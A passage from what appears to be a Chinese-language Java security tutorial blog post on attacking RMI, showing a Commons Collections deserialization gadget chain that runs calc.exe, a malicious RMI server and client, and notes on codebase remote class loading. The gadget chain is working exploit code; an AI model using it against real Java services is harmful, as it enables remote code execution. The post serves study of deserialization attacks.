</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ServerReturnObject</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">UnicastRemoteObject</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">User</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">ServerReturnObject</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getUser</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc.exe&#34;</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">transformerChain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">innerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">outerMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">construct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">construct</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">construct</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">outerMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">construct</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">proxyMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">handler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>恶意服务端将恶意对象注册到注册中心</p>
<div class="code-block-container" id="code-1769750397409684200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397409684200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397409684200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397409684200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397409684200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.AlreadyBoundException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilClassServer</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">,</span><span class="w"> </span><span class="n">AlreadyBoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">liming</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ServerReturnObject</span><span class="p">(</span><span class="s">&#34;liming&#34;</span><span class="p">,</span><span class="n">15</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;user&#34;</span><span class="p">,</span><span class="n">liming</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>客户端获取恶意对象，调用 getUser() 方法，反序列化恶意远程对象</p>
<div class="code-block-container" id="code-1769750397410794200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397410794200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397410794200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397410794200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397410794200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.Registry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilClient</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">getRegistry</span><span class="p">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="n">registry</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;user&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="na">getUser</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png" style="max-width: 100%; height: auto;"></p>
<h5 id="远程加载对象"><!-- raw HTML omitted -->远程加载对象<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#远程加载对象">#</a></h5>
<blockquote>
<p>《Java 安全漫谈》</p>
<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的</p>
<p>CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
<p>如果我们指定 codebase=<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则</p>
<p>Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为</p>
<p>Example类的字节码。</p>
<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻</p>
<p>找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在</p>
<p>本地没有找到这个类，就会去远程加载codebase中的类。</p>
<p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p>
<p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去</p>
<p>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
<p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p>
<ul>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</li>
</ul>
<p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p>
<p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p>
<p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p>
<p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在 java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase ，不再支持从RMI请求中获取。</p>
</blockquote>
<h3 id="43-攻击服务端">4.3 攻击服务端<a hidden class="anchor" aria-hidden="true" href="#43-攻击服务端">#</a></h3>
<p>这一部分同样是熟悉的 unmarshalValue ,</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png" style="max-width: 100%; height: auto;"></p>
<p><strong>服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化</strong></p>
<h2 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h2>
<p>官方文档</p>
<p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p>
<p><!-- raw HTML omitted -->从懵逼到恍然大悟之Java中RMI的使用<!-- raw HTML omitted --></p>
<p><a href="https://blog.csdn.net/lmy86263/article/details/72594760">https://blog.csdn.net/lmy86263/article/details/72594760</a></p>
<p><!-- raw HTML omitted -->JAVA安全基础（四）&ndash; RMI机制<!-- raw HTML omitted --></p>
<p><a href="https://xz.aliyun.com/news/8760">https://xz.aliyun.com/news/8760</a></p>
<p><!-- raw HTML omitted -->一文回顾攻击Java RMI方式<!-- raw HTML omitted --></p>
<p><a href="https://www.anquanke.com/post/id/263726#h2-5">https://www.anquanke.com/post/id/263726#h2-5</a></p>
<p>Java RMI 攻击由浅入深</p>
<p><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
<p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p>
<p><a href="https://www.cnblogs.com/pihaochen/p/11020596.html"><!-- raw HTML omitted -->https://www.cnblogs.com/pihaochen/p/11020596.html<!-- raw HTML omitted --></a></p>
<p><a href="https://xz.aliyun.com/t/9053"><!-- raw HTML omitted -->https://xz.aliyun.com/t/9053<!-- raw HTML omitted --></a></p>
<p><a href="https://xz.aliyun.com/t/7930"><!-- raw HTML omitted -->https://xz.aliyun.com/t/7930<!-- raw HTML omitted --></a></p>
<p><a href="https://xz.aliyun.com/t/6660"><!-- raw HTML omitted -->https://xz.aliyun.com/t/6660<!-- raw HTML omitted --></a></p>
<p><a href="https://xz.aliyun.com/t/7079"><!-- raw HTML omitted -->https://xz.aliyun.com/t/7079<!-- raw HTML omitted --></a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/xvsf/tags/rmi%E9%80%9A%E4%BF%A1/">RMI通信</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/xvsf/posts/jndi/">
    <span class="title">« Prev</span>
    <br>
    <span>JNDI</span>
  </a>
  <a class="next" href="http://localhost:1313/xvsf/posts/cc4_cc2_cc5_cc7/">
    <span class="title">Next »</span>
    <br>
    <span>CC4_CC2_CC5_CC7</span>
  </a>
</nav>

  </footer><div class="giscus"></div>
<script src="https://giscus.app/client.js"
        data-repo="XVSHIFU/xvsf"
        data-repo-id="R_kgDOQ6WxXQ"
        data-category="Announcements"
        data-category-id="DIC_kwDOQ6WxXc4C1A4B"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="light_protanopia"
        data-lang="zh-CN"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>


<script>
document.addEventListener('DOMContentLoaded', function() {
    
    document.querySelectorAll('.code-header').forEach(header => {
        header.addEventListener('click', (e) => {
            
            if (e.target.closest('.copy-btn')) return;
            
            if (e.target.closest('.toggle-btn')) return;
            const container = header.parentElement;
            const isExpanded = container.getAttribute('data-expanded') === 'true';
            const next = !isExpanded;
            container.setAttribute('data-expanded', next);
            container.setAttribute('aria-expanded', next);
            const toggle = container.querySelector('.toggle-btn');
            if (toggle) toggle.setAttribute('aria-expanded', String(next));
        });
    });

    
    document.querySelectorAll('.code-block-container .toggle-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const container = btn.closest('.code-block-container');
            const isExpanded = container.getAttribute('data-expanded') === 'true';
            const next = !isExpanded;
            container.setAttribute('data-expanded', next);
            container.setAttribute('aria-expanded', next);
            
            btn.setAttribute('aria-expanded', String(next));
        });
    });

    
    document.querySelectorAll('.copy-btn').forEach(btn => {
        btn.addEventListener('click', async (e) => {
            e.stopPropagation();
            const container = btn.closest('.code-block-container');
            const codeEl = container && container.querySelector('code');
            const code = codeEl ? codeEl.innerText : '';
            try {
                if (navigator.clipboard && navigator.clipboard.writeText) {
                    await navigator.clipboard.writeText(code);
                } else {
                    const ta = document.createElement('textarea');
                    ta.value = code;
                    document.body.appendChild(ta);
                    ta.select();
                    document.execCommand('copy');
                    ta.remove();
                }
                const originalLabel = btn.getAttribute('aria-label') || '';
                btn.setAttribute('aria-label', '已复制');
                setTimeout(() => btn.setAttribute('aria-label', originalLabel), 2000);
            } catch (err) {
                console.error('Failed to copy!', err);
            }
        });
    });
});
</script>




<script>
(function() {
    
    const STOP_TIME = 15000; 
    const NUMBER_OF_LEAVES = 30; 
    
    
    if (window.innerWidth < 768) return;

    var container = document.createElement('div');
    container.id = "sakura-container";
    container.style.position = 'fixed';
    container.style.top = '0';
    container.style.left = '0';
    container.style.width = '100%';
    container.style.height = '100%';
    container.style.pointerEvents = 'none'; 
    container.style.zIndex = '9999';
    document.body.appendChild(container);

    function createLeaf() {
        var leaf = document.createElement('div');
        
        leaf.style.position = 'absolute';
        leaf.style.width = (Math.random() * 10 + 10) + 'px'; 
        leaf.style.height = (Math.random() * 5 + 5) + 'px';
